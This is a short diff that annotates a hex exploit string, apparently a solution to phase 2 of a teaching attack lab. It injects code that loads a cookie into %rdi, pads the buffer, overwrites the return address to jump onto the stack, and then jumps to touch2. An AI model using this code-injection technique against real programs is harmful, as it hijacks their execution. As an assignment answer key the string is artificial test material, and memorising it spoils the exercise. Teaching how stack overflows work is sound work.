@@ -1,9 +1,9 @@
-48 c7 c7 05 83 1e 38 c3
-54 54 54 54 54 54 54 54
-54 54 54 54 54 54 54 54
-54 54 54 54 54 54 54 54
-54 54 54 54 54 54 54 54
-54 54 54 54 54 54 54 54
-54 54 54 54 54 54 54 54
-78 1e 61 55 00 00 00 00
-a2 15 40 00 00 00 00 00
+48 c7 c7 05 83 1e 38 c3 /* mov $0x381e8305, %rdi ; ret */
+54 54 54 54 54 54 54 54 /* padding */
+54 54 54 54 54 54 54 54 /* padding */
+54 54 54 54 54 54 54 54 /* padding */
+54 54 54 54 54 54 54 54 /* padding */
+54 54 54 54 54 54 54 54 /* padding */
+54 54 54 54 54 54 54 54 /* padding */
+78 1e 61 55 00 00 00 00 /* the return address used to jump to the injection code above */
+a2 15 40 00 00 00 00 00 /* the return address used in the injection code to jump to touch2 */
